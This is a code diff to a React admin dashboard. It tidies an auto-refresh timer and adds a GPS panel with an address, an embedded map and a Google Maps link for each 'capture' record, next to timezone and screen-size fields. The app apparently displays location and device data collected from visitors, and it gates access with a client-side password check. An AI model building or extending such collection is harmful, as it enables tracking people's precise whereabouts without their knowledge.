@@ -43,18 +43,13 @@ export default function Admin() {
     setRefreshing(false);
   }
 
-useEffect(() => {
+  useEffect(() => {
     if (!unlocked) return;
     fetchData();
-
-    // Auto refresh every 30 seconds
-    const interval = setInterval(() => {
-      fetchData();
-    }, 30 * 1000);
-
+    const interval = setInterval(() => { fetchData(); }, 30 * 1000);
     return () => clearInterval(interval);
   }, [unlocked]);
-  
+
   function handleUnlock() {
     if (password === ADMIN_PASSWORD) {
       setUnlocked(true);
@@ -292,6 +287,34 @@ useEffect(() => {
                               {capture.timezone && <DataRow label="Timezone" value={capture.timezone} />}
                               {capture.screenWidth && <DataRow label="Screen" value={capture.screenWidth + "x" + capture.screenHeight} />}
                             </div>
+
+                            {capture.lat && (
+                              <div className="mt-3 pt-3 border-t border-surface-border">
+                                <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-2">GPS Location</div>
+                                {capture.address && (
+                                  <div className="font-mono text-xs text-text-secondary mb-2">{capture.address}</div>
+                                )}
+                                <div className="rounded-xl overflow-hidden border border-surface-border mb-3" style={{ height: 180 }}>
+                                  <iframe
+                                    title={"map-" + i}
+                                    width="100%"
+                                    height="100%"
+                                    frameBorder="0"
+                                    src={"https://maps.google.com/maps?q=" + capture.lat + "," + capture.lon + "&z=15&output=embed"}
+                                    allowFullScreen
+                                  />
+                                </div>
+                                
+                                  <a href={"https://www.google.com/maps?q=" + capture.lat + "," + capture.lon}
+                                  target="_blank"
+                                  rel="noreferrer"
+                                  className="inline-flex items-center gap-2 px-4 py-2 bg-primary text-surface rounded-lg font-body text-xs font-bold hover:bg-primary-dark transition-colors"
+                                >
+                                  📍 View on Google Maps
+                                </a>
+                              </div>
+                            )}
+
                             <div className="font-mono text-xs text-text-muted mt-2">{capture.capturedAt}</div>
                           </div>
                         ))}
